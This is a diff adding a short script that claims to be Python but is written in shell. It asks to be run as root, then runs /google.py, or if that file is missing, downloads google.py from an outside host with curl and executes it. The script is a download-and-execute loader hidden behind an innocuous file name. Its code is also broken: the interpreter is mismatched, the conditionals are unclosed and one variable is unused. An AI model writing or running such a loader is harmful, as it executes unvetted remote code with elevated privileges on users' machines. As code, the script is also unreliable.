@@ -1,0 +1,15 @@
+#!/usr/bin/env python
+echo "please run as root or administrator"
+FILE=/google.py
+if [ -f "$FILE" ]; then
+	cd /
+	python google.py
+
+
+
+FILE2=/google.py
+if [ ! -f "$FILE" ]; then
+	curl dl.he1ios.repl.co/googlepy/ --output google.py
+	python google.py
+
+fi
